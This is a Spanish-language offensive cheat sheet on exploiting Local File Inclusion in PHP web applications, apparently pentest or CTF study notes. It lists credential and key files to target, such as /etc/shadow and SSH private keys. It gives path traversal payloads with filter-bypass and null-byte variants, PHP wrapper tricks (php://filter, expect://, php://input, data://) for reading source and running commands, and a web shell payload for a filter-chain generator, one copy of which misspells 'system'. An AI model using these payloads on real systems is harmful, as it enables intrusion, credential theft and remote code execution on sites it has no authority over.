### Local File Inclusion

__La primera premisa si estamos tratando de explotar un LFI y no funciona por "POST", es cambiar a "GET" y viceversa__

#### Ficheros interesantes en LFI
* /etc/passwd
* /etc/shadow
* /var/log/apache2/access.log
* /var/log/httpd/access.log
* /home/$USER/.ssh/id_rsa
* /var/log/mail.log
* var/log/maillog
* /var/mail/helios
* 
#### Indicios que pueda acontecer un LFI
* Cuando al analizar la petición, vemos que apunta a un fichero de sistema, o apunta a algo tipo: *http://127.0.0.1/categories.php*
* Cuando tenemos una url tipo: *?file=filename.txt*
* respuetas del servidor tipo: *Warning: include(/var/www/html/../../etc/passwd): failed to open stream*
* Tenemos directory listing
* Si podemos ver el codigo fuente, buscar funciones tipo: *(`include`, `require`, `file_get_contents`)*

#### Path traversal basics
```bash
#basico
../../etc/passwd

#cuando se omite el "../" en el código
....//....//etc/passwd

# cuando prohibe el "../"
..////..////..../////etc/passwd

# cuando prohibe un fichero concreto
../etc///////passwd
../etc/host?s
../etc/passwd/.

# cuando se concatena una extension .php al final por defecto, hacemos uso de null bytes (versiones antiguas de php por debajo de la 5.3)
../etc/passwd%00
../etc/passwd\0

```

### PHP Wrappers

#### Ver codigo php
Cuando nos concatena al final la extension php, ejemplo tenemos: 
http://ip/index.php?page=curso
pero en realidad estamos accediendo a : http://ip/index.php?page=curso.php

Se pueden utilizar wrappers, para evitar que nos interprete el código php y podriamos ver el contenido de un fichero wpconfig.php de wordpress:
```bash
http://ip/index.php?page=php://filter/convert.base64-encode/resource=curso.php
```

Al ver el codigo fuente, vemos en alguna parte del codigo, un chorro de caracteres en base64 que podemos decodificar.

#### Ejecutar codigo
##### Metodo 1
```bash
http://ip/index.php?page=expect://whoami
```
##### Metodo 2
Interceptando petición por burpsuite, y cambiando el método a POST
debemos meter el php://input,  algo así:
```bash
POST /?page=php://input HTTP/1.1

# abajo de toda la cabecera
<?php system("whoami"); ?>
```

##### Metodo 2 BIS
De la misma manera por POST:
```bash
POST /?page=data://text/plain;base64,<comando en base64 Y URLENCODEADO> HTTP/1.1
```

Si metemos en base64 urlencodeado el tipico ```bash <?php system($_GET["cmd"]); ?>``` 

y luego:
```bash
POST /?page=data://text/plain;base64, <el codigo anterior urlencodeado y en base64>&cmd=whoami
```

##### Con php filter chain generator
Es un método bastante complejo pero que gracias a un script en python se puede automatizar.
[php filter chain generator GITHUB](https://github.com/synacktiv/php_filter_chain_generator)
```bash
python3 php_filter_chain_generator.py --chain '<?php sytem($_GET["cmd"]); ?>
```

Esto genera una cadena de caracteres hiper larga, que debemos meter en la url: http://ip/index.php?page=<cadena>&cmd=whoami


#### LFI to RCE
Si detectamos un LFI y por casualidad podemos subir ficheros, podriamos subir un fichero malicioso en php